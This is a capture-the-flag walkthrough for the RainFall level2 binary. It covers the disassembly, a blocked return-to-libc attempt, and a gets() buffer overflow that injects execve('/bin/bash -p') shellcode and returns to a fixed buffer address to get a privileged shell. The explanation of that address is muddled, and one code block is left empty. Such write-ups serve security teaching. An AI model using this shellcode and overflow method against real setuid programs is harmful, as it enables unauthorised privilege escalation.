##  Description

This level greets us with a similar setup as the previous one if we look at the binary:

```bash
level2@RainFall:~$ gdb -batch ./level2 -ex 'disassemble main'
Dump of assembler code for function main:
   0x0804853f <+0>:	    push   %ebp
   0x08048540 <+1>:	    mov    %esp,%ebp
   0x08048542 <+3>:	    and    $0xfffffff0,%esp
   0x08048545 <+6>:	    call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret    
End of assembler dump.
```

Let's look at that function `p`:

```bash
level2@RainFall:~$ gdb -batch ./level2 -ex 'disassemble p'
Dump of assembler code for function p:
   0x080484d4 <+0>:	    push   %ebp
   0x080484d5 <+1>:	    mov    %esp,%ebp
   0x080484d7 <+3>:	    sub    $0x68,%esp
   0x080484da <+6>:	    mov    0x8049860,%eax
   0x080484df <+11>:	mov    %eax,(%esp)
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    -0x4c(%ebp),%eax
   0x080484ea <+22>:	mov    %eax,(%esp)
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    0x4(%ebp),%eax
   0x080484f5 <+33>:	mov    %eax,-0xc(%ebp)
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    $0x8048620,%eax
   0x0804850c <+56>:	mov    -0xc(%ebp),%edx
   0x0804850f <+59>:	mov    %edx,0x4(%esp)
   0x08048513 <+63>:	mov    %eax,(%esp)
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	movl   $0x1,(%esp)
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    -0x4c(%ebp),%eax
   0x0804852a <+86>:	mov    %eax,(%esp)
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    -0x4c(%ebp),%eax
   0x08048535 <+97>:	mov    %eax,(%esp)
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave  
   0x0804853e <+106>:	ret    
End of assembler dump.
```

While the function still calls `gets`, the `system` call is no longer present in the PLT:

```
level2@RainFall:~$ objdump -d level2 | grep '@plt'
08048410 <__libc_start_main@plt>:
 804843c:	e8 cf ff ff ff       	call   8048410 <__libc_start_main@plt>
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
```

It is still possible to find the address of the `system` function in the libc:

```bash
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>
```

But the check for the high bits of the return address prevents us from returning to the stack or the libc, since the high ranges `0xb7xxxxxx` are filtered out:

```bash
(gdb) run < <(python -c 'print("A"*80 + "\x60\xb0\xe6\xb7")')
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/level2/level2 < <(python -c 'print("A"*80 + "\x60\xb0\xe6\xb7")')
(0xb7e6b060)
[Inferior 1 (process 4843) exited with code 01]
```

The real strategy here is to inject some shellcode into the buffer, since the address range is not filtered out, and then return to it:

```bash
python -c 'import struct; shellcode = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"; print(shellcode + "A"*(80-len(shellcode)) + struct.pack("<I", 0x804a008))' > /tmp/payload
```

```assembler
6a 0b           push 0xb          ; syscall 11 = execve
58              pop eax           ; eax = 11
99              cdq               ; edx = 0
52              push edx          ; NULL terminator
66 68 2d 70     push word 0x702d  ; "-p"
89 e1           mov ecx, esp      ; ecx points to "-p"
52              push edx          ; NULL
6a 68           push byte 0x68    ; "h"
68 2f 62 61 73  push 0x7361622f   ; "/bas"
68 2f 62 69 6e  push 0x6e69622f   ; "/bin"
89 e3           mov ebx, esp      ; ebx points to "/bin/bash"
52              push edx          ; argv[2] = NULL
51              push ecx          ; argv[1] = "-p"
53              push ebx          ; argv[0] = "/bin/bash"
89 e1           mov ecx, esp      ; ecx = argv
cd 80           int 0x80          ; SYSCALL : execve(ebx, ecx, edx)
```

[Source of the shellcode](https://shell-storm.org/shellcode/files/shellcode-606.html)

This is a relatively short shellcode that executes `execve("/bin/bash", "-p", NULL)`, which gives us a shell with the `-p` flag, meaning that it will preserve the effective user ID and group ID, allowing us to keep the privileges of the `level2` user.

Additionally, we have to inject some padding to reach 80 bytes and then overwrite the return address with the address of the buffer, which is `0x804a008` in this case, since the buffer is located at `-0x4c(%ebp)` and `ebp` is located at `0x804a054`:

```bash

We then need to inject this shellcode like so:

```bash
level2@RainFall:~$ cat /tmp/payload - | ./level2
```

Note the `-` after the payload file, this tells `cat` to read from standard input after reading the file, allowing us to append more data to the payload. This is effectively the same as doing:

```bash
level2@RainFall:~$ (cat /tmp/payload ; cat) | ./level2
```
